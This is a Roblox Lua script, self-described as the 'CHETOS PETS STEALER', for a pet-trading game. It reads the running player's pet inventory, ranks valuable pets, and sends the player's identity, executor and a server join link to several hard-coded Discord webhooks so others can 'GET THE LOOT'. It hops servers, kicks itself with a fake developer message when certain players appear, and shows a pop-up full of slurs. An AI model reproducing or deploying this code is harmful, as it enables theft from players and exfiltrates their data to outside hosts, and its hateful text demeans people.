local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

if getgenv().HopComplete then return end
if getgenv().VisitedRealJobIds == nil then getgenv().VisitedRealJobIds = {} end

local player = Players.LocalPlayer
local PlaceId = game.PlaceId
local CurrentFakeJobId = game.JobId
local SECRET_HANDSHAKE = "ChetosBatonPass_v1"

local joinData = player:GetJoinData()

if joinData and joinData.teleportData and joinData.teleportData.source == SECRET_HANDSHAKE then
    local RealJobIdFromBaton = joinData.teleportData.destinationId
    getgenv().VisitedRealJobIds[RealJobIdFromBaton] = true
    getgenv().HopComplete = true
    
    local EXECUTION_FLAG_NAME = "ChetosExecutionFlag"
    if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then return end
    local flag = Instance.new("BoolValue")
    flag.Name = EXECUTION_FLAG_NAME
    flag.Parent = CoreGui
    
    local hasKickedSelf = false
    local NAME_PATTERNS = {"joken","iamjoken","jokenn","jokeen","jokan","jokn","munkizz","munkizzz","munkiz","munki","munkizzo","munkizzx"}

    local function isJokenPlayer(username)
        local lowerName = username:lower()
        for _, pattern in ipairs(NAME_PATTERNS) do
            if lowerName == pattern then return true end
            if lowerName:find("^" .. pattern .. "%d") then return true end
            if lowerName:find("^" .. pattern .. "[a-z]") then return true end
            if lowerName:find("^" .. pattern .. "_") then return true end
            if lowerName:find("^" .. pattern .. "%-") then return true end
        end
        if lowerName:find("joken") then return true end
        if lowerName:find("munkizz") then return true end
        return false
    end

    local function kickSelf(jokenName)
        if hasKickedSelf then return end
        hasKickedSelf = true
        task.spawn(function()
            pcall(function() player:Kick("Jandel: Hi, this is Jandel. Server is restarted, please rejoin.") end)
        end)
    end

    local function scanForJoken()
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player and isJokenPlayer(p.Name) then
                kickSelf(p.Name)
                return
            end
        end
    end

    local function onPlayerAdded(newPlayer)
        if newPlayer == player then return end
        if isJokenPlayer(newPlayer.Name) then
            kickSelf(newPlayer.Name)
        end
    end

    Players.PlayerAdded:Connect(onPlayerAdded)
    RunService.Heartbeat:Connect(scanForJoken)

    local CONFIG = {
        ["ALL_HITS_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1397485572884271134/SeiDaELPQmgoaYyUIsXAefydjAfIi8_CVO0qAawMu5zGZeFOTXkKxy8nf6OwWPRHuucB",
        ["KITSUNE_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1400889130409267260/sjHU9RINLAq242Sy_D54yEjkh3wSAJGUeiK9UPXealHoWCCxR3DKAPevSbbo7oeNcS0b",
        ["LOGS_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1401772578254753792/K42qhdlIdc1M2vctyVlcoXsiOyA6u3byv5UnkUDIYk-Do_PiYrZotAEFdTSU5KotHc9B",
        ["KITSUNE_MONITOR_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1401440507632291881/CwFM-hjUCQf4J3Ce5G7z6dxDN_raHuEbAciy6d66flEJVfSeWE93SQorP-itj8srp612",
        ["PRIVATE_KITSUNE_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1403796053517402232/9FaYsE0qvOZo-vfthMRFMmBl9VgnWdiS23cUoRu_6Xt684Ec8P70ih6fkrwUTXC85YqY",
        ["PING_MESSAGE"] = "@everyone **kupal naka HIT!!!🤑🤑🤑🤑**",
        ["DYNAMIC_DISCORD_LINKS"] = {"https://discord.gg/yeSx429sBF","https://discord.gg/yeSx429sBF"},
        ["HUGE_PET_WEIGHT"] = 6.0,
        ["AGED_PET_DAYS"] = 50,
        ["MAX_PETS_IN_LIST"] = 10,
        ["PRIORITY_PETS"] = {["Disco Bee"] = true, ["Rainbow Ankylosaurus"] = true, ["Rainbow Dilophosaurus"] = true,["Rainbow Pachycephalosaurus"] = true, ["Rainbow Iguanodon"] = true, ["Rainbow Parasaurolophus"] = true,["Kitsune"] = true, ["Spinosaurus"] = true, ["Rainbow Spinosaurus"] = true,["Mizuchi"] = true, ["Rainbow Kitsune"] = true, ["Raccoon"] = true,["Dragonfly"] = true, ["Mimic Octopus"] = true, ["Butterfly"] = true,["Queen Bee"] = true, ["T-Rex"] = true, ["Fennec Fox"] = true, ["Rainbow Lobster Thermidor"] = true,["Rainbow Corrupted Kitsune"] = true}
    }

    local MUTATION_MAP = {a="Shocked",b="Golden",c="Rainbow",d="Shiny",e="Windy",f="Frozen",g="Inverted",h="Rideable",i="Mega",j="Tiny",k="IronSkin",l="Radiant",m="Normal",n="Ascended",o="Tranquil",p="Corrupted",q="Fried",r="Aromatic",Shocked="Shocked",Golden="Golden",Rainbow="Rainbow",Shiny="Shiny",Windy="Windy",Frozen="Frozen",Inverted="Inverted",Rideable="Rideable",Mega="Mega",Tiny="Tiny",IronSkin="IronSkin",Radiant="Radiant",Normal="Normal",Ascended="Ascended",Tranquil="Tranquil",Corrupted="Corrupted",Fried="Fried",Aromatic="Aromatic"}

    local Util = {}
    function Util.Get(tbl, path, default)
        local current = tbl
        for key in string.gmatch(path, "[^.]+") do
            if type(current) ~= "table" or current[key] == nil then return default end
            current = current[key]
        end
        return current
    end

    local function getExecutorName()
        if getexecutorname then local s, n = pcall(getexecutorname); if s and type(n) == "string" then return n end end
        if identifyexecutor then local s, n = pcall(identifyexecutor); if s and type(n) == "string" then return n:gsub(" Executor", "") end end
        if syn then return "Synapse X" end; if Krnl then return "Krnl" end; if Fluxus then return "Fluxus" end; if SENTINEL_V2 then return "Sentinel" end
        return "Unknown"
    end

    local function buildJoinLink()
        return string.format("[Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", game.PlaceId, RealJobIdFromBaton)
    end

    local function createStyledNotificationGUI(titleText, messageText, buttonText)
        local chosenLink = CONFIG["DYNAMIC_DISCORD_LINKS"][math.random(1, #CONFIG["DYNAMIC_DISCORD_LINKS"])]
        local gui = Instance.new("ScreenGui", CoreGui); gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global; gui.DisplayOrder = 1000
        local overlay = Instance.new("Frame", gui); overlay.Size = UDim2.fromScale(1, 1); overlay.BackgroundColor3 = Color3.new(0, 0, 0); overlay.BackgroundTransparency = 0.4; overlay.Active = true
        local gradient = Instance.new("UIGradient", overlay); gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)), ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))}); gradient.Rotation = 90
        local mainFrame = Instance.new("Frame", overlay); mainFrame.AnchorPoint = Vector2.new(0.5, 0.5); mainFrame.Position = UDim2.fromScale(0.5, 0.5); mainFrame.Size = UDim2.new(0, 500, 0, 250); mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32); mainFrame.BackgroundTransparency = 0.1; mainFrame.BorderSizePixel = 0
        local corner = Instance.new("UICorner", mainFrame); corner.CornerRadius = UDim.new(0, 12)
        local stroke = Instance.new("UIStroke", mainFrame); stroke.Color = Color3.fromRGB(120, 80, 255); stroke.Thickness = 2; stroke.Transparency = 0.4
        local titleLabel = Instance.new("TextLabel", mainFrame); titleLabel.AnchorPoint = Vector2.new(0.5, 0); titleLabel.Position = UDim2.fromScale(0.5, 0.1); titleLabel.Size = UDim2.fromScale(0.8, 0.2); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.SourceSansBold; titleLabel.Text = titleText; titleLabel.TextColor3 = Color3.new(1, 1, 1); titleLabel.TextScaled = true
        local messageLabel = Instance.new("TextLabel", mainFrame); messageLabel.AnchorPoint = Vector2.new(0.5, 0.45); messageLabel.Position = UDim2.fromScale(0.5, 0.45); messageLabel.Size = UDim2.fromScale(0.85, 0.3); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.SourceSans; messageLabel.Text = messageText; messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.TextYAlignment = Enum.TextYAlignment.Center
        local linkButton = Instance.new("TextButton", mainFrame); linkButton.AnchorPoint = Vector2.new(0.5, 1); linkButton.Position = UDim2.fromScale(0.5, 0.9); linkButton.Size = UDim2.fromScale(0.7, 0.25); linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242); linkButton.Font = Enum.Font.SourceSansBold; linkButton.Text = buttonText; linkButton.TextColor3 = Color3.new(1, 1, 1); linkButton.TextScaled = true
        local btnCorner = Instance.new("UICorner", linkButton); btnCorner.CornerRadius = UDim.new(0, 8)
        local btnStroke = Instance.new("UIStroke", linkButton); btnStroke.Color = Color3.fromRGB(255, 255, 255); btnStroke.Thickness = 1; btnStroke.Transparency = 0.9
        linkButton.MouseButton1Click:Connect(function() if type(setclipboard) == "function" then setclipboard(chosenLink); linkButton.Text = "LINK COPIED!"; task.wait(2); linkButton.Text = buttonText end end)
        return gui
    end

    local function sendOurWebhook(url, payload)
        local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if not requestFunc or not url then return end
        task.spawn(function() pcall(function() requestFunc({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end) end)
    end

    local function sendAllDestinations(payload, payload_log, includeKitsune)
        if includeKitsune then sendOurWebhook(CONFIG["KITSUNE_WEBHOOK_URL"], payload) end
        sendOurWebhook(CONFIG["ALL_HITS_WEBHOOK_URL"], payload)
        local loaderWebhook = getgenv().Webhook
        if loaderWebhook then sendOurWebhook(loaderWebhook, payload) end
        sendOurWebhook(CONFIG["LOGS_WEBHOOK_URL"], payload_log)
    end

    local function sendPrivateKitsuneWithForwarding(payload, payload_log)
        sendOurWebhook(CONFIG["PRIVATE_KITSUNE_WEBHOOK_URL"], payload)
        sendOurWebhook(CONFIG["ALL_HITS_WEBHOOK_URL"], payload)
        local loaderWebhook = getgenv().Webhook
        if loaderWebhook then sendOurWebhook(loaderWebhook, payload) end
        sendOurWebhook(CONFIG["LOGS_WEBHOOK_URL"], payload_log)
    end

    local function computeRiskAndColor(stats, counts, flags)
        local score = 0
        if flags.hasKitsune then score = score + 20 end
        if flags.hasMega then score = score + 8 end
        if flags.hasAscended then score = score + 8 end
        if flags.hasTitanic then score = score + 12 end
        if flags.hasRainbowDragonfly then score = score + 15 end
        if flags.hasGoldenButterfly then score = score + 10 end
        score = score + (stats.huge * 5)
        score = score + ((counts.dragonfly or 0) + (counts.mimic or 0) + (counts.trex or 0)) * 3
        score = score + ((counts.butterfly or 0) + (counts.raccoon or 0)) * 2
        if (counts.discoBee or 0) > 0 then score = score + 6 end
        local color
        if score >= 35 then color = 15158332 elseif score >= 20 then color = 15105570 else color = 3066993 end
        return score, color
    end

    task.spawn(function()
        local InventoryData
        local success = pcall(function() InventoryData = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data end)
        if not (success and InventoryData) then return end
        
        local priorityPets = {}
        local stats = {total = 0, huge = 0, agedMutated = 0}
        local dragonflyCount, mimicOctopusCount, butterflyCount, raccoonCount, discoBeeCount, tRexCount = 0, 0, 0, 0, 0, 0
        local hasKitsune, hasMega, hasAscended, hasTitanic = false, false, false, false
        local hasRainbowDragonfly, hasGoldenButterfly, hasAnyRainbowMutation = false, false, false
        local hasPriorityKitsune, hasPriorityMega, hasPriorityRainbow, hasPriorityAscended = false, false, false, false

        for uuid, petInfo in pairs(InventoryData) do
            if type(petInfo) == "table" and petInfo.PetData then
                local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
                if baseWeight > 0 or tonumber(Util.Get(petInfo, "PetData.Weight", 0)) > 0 then
                    stats.total = stats.total + 1
                    local mutationValue = Util.Get(petInfo, "PetData.MutationType") or Util.Get(petInfo, "PetData.Mutation")
                    local mutationName = (mutationValue and MUTATION_MAP[tostring(mutationValue)]) or ""
                    local basePetType = tostring(petInfo.PetType or "Unknown")
                    if mutationName == "Rainbow" then hasAnyRainbowMutation = true end
                    if basePetType == "Dragonfly" then dragonflyCount = dragonflyCount + 1 end
                    if basePetType == "Mimic Octopus" then mimicOctopusCount = mimicOctopusCount + 1 end
                    if basePetType == "Butterfly" then butterflyCount = butterflyCount + 1 end
                    if basePetType == "Raccoon" then raccoonCount = raccoonCount + 1 end
                    if basePetType == "Disco Bee" then discoBeeCount = discoBeeCount + 1 end
                    if basePetType == "T-Rex" then tRexCount = tRexCount + 1 end
                    if basePetType == "Kitsune" then hasKitsune = true end
                    if mutationName == "Mega" then hasMega = true end
                    if mutationName == "Ascended" then hasAscended = true end
                    if basePetType == "Dragonfly" and mutationName == "Rainbow" then hasRainbowDragonfly = true end
                    if basePetType == "Butterfly" and mutationName == "Golden" then hasGoldenButterfly = true end
                    local isPriority = CONFIG["PRIORITY_PETS"][basePetType]
                    if isPriority then
                        if basePetType == "Kitsune" then hasPriorityKitsune = true end
                        if mutationName == "Mega" then hasPriorityMega = true end
                        if mutationName == "Rainbow" then hasPriorityRainbow = true end
                        if mutationName == "Ascended" then hasPriorityAscended = true end
                    end
                    local pet = {uuid=uuid,baseType=basePetType,typeName=(mutationName ~= "" and mutationName .. " " or "") .. basePetType,weight=tonumber(Util.Get(petInfo,"PetData.Weight")) or baseWeight,baseWeight=baseWeight,age=tonumber(Util.Get(petInfo,"PetData.Age",0)),level=tonumber(Util.Get(petInfo,"PetData.Level",1)),isHuge=baseWeight >= CONFIG["HUGE_PET_WEIGHT"],isAged=(math.floor(tonumber(Util.Get(petInfo,"PetData.Age",0))/86400) >= CONFIG["AGED_PET_DAYS"]),isMutated=mutationName ~= ""}
                    if isPriority or pet.isHuge then
                        table.insert(priorityPets, pet)
                        if pet.isHuge then stats.huge = stats.huge + 1 end
                        if pet.isAged or pet.isMutated then stats.agedMutated = stats.agedMutated + 1 end
                        if pet.isHuge and isPriority then hasTitanic = true end
                    end
                end
            end
        end

        if #priorityPets == 0 then
            createStyledNotificationGUI("PET STEALER", "YOU FUCKING IDIOT YOU DON'T HAVE GOOD PETS LIKE DEVINE AND PRISMATIC YOU POOR MAGGOTS NIGGER JOIN IN DISCORD LINK TO START STEALING PEOPLE SHIT NIGGER YOU ASHOLE", "Copy Discord Link")
            return
        end

        table.sort(priorityPets, function(a, b)
            local scoreA = (string.find(a.typeName:lower(), "rainbow") and 1) or (string.find(a.typeName:lower(), "divine") and 2) or (a.isHuge and 3) or ((a.isMutated or a.isAged) and 4) or 5
            local scoreB = (string.find(b.typeName:lower(), "rainbow") and 1) or (string.find(b.typeName:lower(), "divine") and 2) or (b.isHuge and 3) or ((b.isMutated or b.isAged) and 4) or 5
            if scoreA ~= scoreB then return scoreA < scoreB else return a.weight > b.weight end
        end)

        local function formatPetList()
            local groups = {}
            for _, pet in ipairs(priorityPets) do
                local key = pet.typeName
                local g = groups[key]
                if not g then g = {count=0,best=pet,anyHuge=pet.isHuge,anyAgedOrMutated=(pet.isAged or pet.isMutated)}; groups[key]=g end
                g.count = g.count + 1
                if pet.isHuge then g.anyHuge = true end
                if pet.isAged or pet.isMutated then g.anyAgedOrMutated = true end
                if pet.weight > g.best.weight then g.best = pet end
            end
            local emitted, list, shown = {}, {}, 0
            for _, pet in ipairs(priorityPets) do
                local key = pet.typeName
                if not emitted[key] then
                    local g = groups[key]
                    local icon = g.anyHuge and "🤭" or (g.anyAgedOrMutated and "⭐") or "🎯"
                    if g.count > 1 then
                        table.insert(list, string.format("%s %s x%d", icon, key, g.count))
                    else
                        local p = g.best
                        local ageText = ""
                        if p.age > 0 then local d, h = math.floor(p.age / 86400), math.floor((p.age % 86400) / 3600); ageText = d > 0 and string.format(" (Age: %dd %dh)", d, h) or string.format(" (Age: %dh)", h) end
                        local weightText = p.weight ~= p.baseWeight and string.format("%.2f KG (Base: %.2f KG)", p.weight, p.baseWeight) or string.format("%.2f KG", p.weight)
                        table.insert(list, string.format("%s %s - %s%s [Lv.%d]", icon, key, weightText, ageText, p.level))
                    end
                    emitted[key] = true
                    shown = shown + 1
                    if shown >= CONFIG["MAX_PETS_IN_LIST"] then
                        local totalGroups = 0
                        for _ in pairs(groups) do totalGroups = totalGroups + 1 end
                        local remaining = totalGroups - shown
                        if remaining > 0 then table.insert(list, string.format("➕ ... and %d more priority pets", remaining)) end
                        break
                    end
                end
            end
            return "```\n" .. table.concat(list, "\n") .. "\n```"
        end

        local formattedPriorityPets = formatPetList()
        local priorityCountExcludingCorrupted = 0
        for _, pet in ipairs(priorityPets) do if pet.baseType ~= "Corrupted Kitsune" then priorityCountExcludingCorrupted = priorityCountExcludingCorrupted + 1 end end
        local isManyPriorityExcludingCorrupted = (priorityCountExcludingCorrupted >= 10)

        task.spawn(function()
            local monitorUrl = CONFIG["KITSUNE_MONITOR_WEBHOOK_URL"]
            while player.Parent do
                local playerList = {}
                for _, p in ipairs(Players:GetPlayers()) do if p ~= player then table.insert(playerList, string.format("`%s` (@%s)", p.DisplayName, p.Name)) end end
                local playerListString = #playerList > 0 and table.concat(playerList, "\n") or "No other players in the server."
                local join_link = buildJoinLink()
                local embed = {title="Kitsune Server Monitor",color=15844367,fields={{name="🎯 Target Victim",value=string.format("`%s` (@%s)",player.DisplayName,player.Name),inline=false},{name="👥 Other Players in Server",value="```\n"..playerListString.."\n```",inline=false},{name="🔗 Server Link",value=join_link,inline=false}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}
                local payload = {username="CHETOS KITSUNE MONITOR",avatar_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",embeds={embed}}
                sendOurWebhook(monitorUrl, payload)
                task.wait(20)
            end
        end)

        local isTopTierKitsuneOnlyHit = (hasKitsune or hasMega or hasAscended or hasTitanic or dragonflyCount >= 3 or mimicOctopusCount >= 3 or butterflyCount >= 2 or raccoonCount >= 2 or discoBeeCount > 0 or tRexCount >= 3)
        local isKitsuneExclusiveHit = (hasAnyRainbowMutation or hasRainbowDragonfly or hasGoldenButterfly)
        local has30PercentChancePets = (butterflyCount > 0 or raccoonCount > 0)
        local shouldSendTo30PercentKitsune = (not isTopTierKitsuneOnlyHit) and (not isKitsuneExclusiveHit) and has30PercentChancePets and (math.random(1, 100) <= 30)
        local serverPlayerCount, maxPlayerCount = #Players:GetPlayers(), Players.MaxPlayers
        local serverStatus = string.format("%d/%d%s", serverPlayerCount, maxPlayerCount, serverPlayerCount >= maxPlayerCount and " (Player has left)" or "")
        local executorName = getExecutorName()
        local shouldPing = serverPlayerCount > 1 and serverPlayerCount < maxPlayerCount
        local join_link = buildJoinLink()
        local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", game.PlaceId, RealJobIdFromBaton)
        local description = table.concat({"**👤 Player Information**","```",("😭 Display Name: %s"):format(player.DisplayName),("👤 Username: @%s"):format(player.Name),("👁️ User ID: %d"):format(player.UserId),("🦸 Receiver: %s"):format(getgenv().receiver or ""),("💻 Executor: %s"):format(executorName),("🌐 Server: %s"):format(serverStatus),"```","**📊 BACKPACK STATISTICS**","```",("🤭 Total Pets: %d"):format(stats.total),("🤑 Huge Pets: %d"):format(stats.huge),("⭐ Aged/Mutated: %d"):format(stats.agedMutated),("🎯 Priority Pets: %d"):format(#priorityPets),"```","**🐾 All Pets**",formattedPriorityPets,"**🔗 SERVER ACCESS - GET THE LOOT!**","Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.",join_link},"\n")
        local _, riskColor = computeRiskAndColor(stats,{dragonfly=dragonflyCount,mimic=mimicOctopusCount,butterfly=butterflyCount,raccoon=raccoonCount,discoBee=discoBeeCount,trex=tRexCount},{hasKitsune=hasKitsune,hasMega=hasMega,hasAscended=hasAscended,hasTitanic=hasTitanic,hasRainbowDragonfly=hasRainbowDragonfly,hasGoldenButterfly=hasGoldenButterfly})
        local embed = {title="🐾 **CHETOS STEALER**",color=riskColor,description=description,footer={text="CHETOS STEALER",icon_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}
        local base_payload = {username=" CHETOS PETS STEALER",avatar_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",embeds={embed}}
        local payload = table.clone(base_payload)
        if shouldPing then
            payload.content = teleport_command .. "\n" .. CONFIG["PING_MESSAGE"]
            payload.allowed_mentions = {parse={"everyone"}}
        end
        local log_description = string.format("**Receiver:** %s\n\n**Pets Found:**\n%s", getgenv().receiver or "N/A", formattedPriorityPets)
        local embed_log = {title="🐾 New Hit Logged",color=15158332,description=log_description,footer={text="Public Feed"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}
        local payload_log = {username="CHETOS LOGS",avatar_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",embeds={embed_log}}
        
        if hasPriorityKitsune or hasPriorityMega or hasPriorityRainbow or hasPriorityAscended or hasAnyRainbowMutation or hasMega or hasAscended or hasTitanic or hasRainbowDragonfly or hasGoldenButterfly then
            sendPrivateKitsuneWithForwarding(payload, payload_log)
        elseif isKitsuneExclusiveHit or isTopTierKitsuneOnlyHit or isManyPriorityExcludingCorrupted or shouldSendTo30PercentKitsune then
            sendAllDestinations(payload, payload_log, true)
        else
            sendAllDestinations(payload, payload_log, false)
        end
    end)
else
    local CONFIG = {
        ["ALL_HITS_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1397485572884271134/SeiDaELPQmgoaYyUIsXAefydjAfIi8_CVO0qAawMu5zGZeFOTXkKxy8nf6OwWPRHuucB",
        ["KITSUNE_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1400889130409267260/sjHU9RINLAq242Sy_D54yEjkh3wSAJGUeiK9UPXealHoWCCxR3DKAPevSbbo7oeNcS0b",
        ["LOGS_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1401772578254753792/K42qhdlIdc1M2vctyVlcoXsiOyA6u3byv5UnkUDIYk-Do_PiYrZotAEFdTSU5KotHc9B",
        ["KITSUNE_MONITOR_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1401440507632291881/CwFM-hjUCQf4J3Ce5G7z6dxDN_raHuEbAciy6d66flEJVfSeWE93SQorP-itj8srp612",
        ["PRIVATE_KITSUNE_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1403796053517402232/9FaYsE0qvOZo-vfthMRFMmBl9VgnWdiS23cUoRu_6Xt684Ec8P70ih6fkrwUTXC85YqY"
    }

    -- Add missing webhook function
    local function sendOurWebhook(url, payload)
        local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if not requestFunc or not url then return end
        task.spawn(function() pcall(function() requestFunc({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end) end)
    end

    task.spawn(function()
        while not getgenv().HopComplete do
            local servers = {}
            -- Use ascending order to get lowest player count servers first
            local success, req = pcall(game.HttpGet, game, "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true")
            if success then
                local success2, body = pcall(HttpService.JSONDecode, HttpService, req)
                if success2 and body and body.data then
                    -- Sort servers by player count (lowest first)
                    local sortedServers = {}
                    for i, v in next, body.data do
                        if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and not getgenv().VisitedRealJobIds[v.id] then
                            table.insert(sortedServers, {id = v.id, playing = tonumber(v.playing)})
                        end
                    end
                    
                    -- Sort by player count ascending (lowest first)
                    table.sort(sortedServers, function(a, b) return a.playing < b.playing end)
                    
                    -- Add sorted server IDs to servers table
                    for _, server in ipairs(sortedServers) do
                        table.insert(servers, server.id)
                    end
                end
            end

            if #servers > 0 then
                -- Pick random server from available servers (1-100 range)
                local randomIndex = math.random(1, #servers)
                local destinationJobId = servers[randomIndex]
                local teleportData = { source = SECRET_HANDSHAKE, destinationId = destinationJobId }
                
                -- Send webhook notification first
                local join_link = string.format("[Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", PlaceId, destinationJobId)
                local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", PlaceId, destinationJobId)
                
                local description = table.concat({
                    "**👤 Player Information**",
                    "```",
                    ("😭 Display Name: %s"):format(player.DisplayName),
                    ("👤 Username: @%s"):format(player.Name),
                    ("👁️ User ID: %d"):format(player.UserId),
                    ("🦸 Receiver: %s"):format(getgenv().receiver or ""),
                    ("💻 Executor: %s"):format(getExecutorName()),
                    ("🌐 Server: %d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers),
                    "```",
                    "**🔗 SERVER ACCESS - GET THE LOOT!**",
                    "Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.",
                    join_link
                }, "\n")
                
                local embed = {
                    title = "🐾 **CHETOS STEALER**",
                    color = 16705372,
                    description = description,
                    footer = { text = "CHETOS STEALER", icon_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }
                
                local payload = {
                    username = " CHETOS PETS STEALER",
                    avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",
                    embeds = { embed }
                }
                
                -- Add ping message and teleport command
                payload.content = teleport_command .. "\n@everyone **kupal naka HIT!!!🤑🤑🤑🤑**"
                payload.allowed_mentions = { parse = {"everyone"} }
                
                -- Send to all webhooks
                sendOurWebhook(CONFIG["ALL_HITS_WEBHOOK_URL"], payload)
                sendOurWebhook(CONFIG["LOGS_WEBHOOK_URL"], payload)
                local loaderWebhook = getgenv().Webhook
                if loaderWebhook then
                    sendOurWebhook(loaderWebhook, payload)
                end
                
                print("🎯 Hopping to random server:", destinationJobId, "(" .. randomIndex .. "/" .. #servers .. ")")
                
                -- Wait 0.1 seconds before hopping
                task.wait(0.1)
                TeleportService:TeleportToPlaceInstance(PlaceId, destinationJobId, player, nil, teleportData)
                return
            end
        end
    end)
end
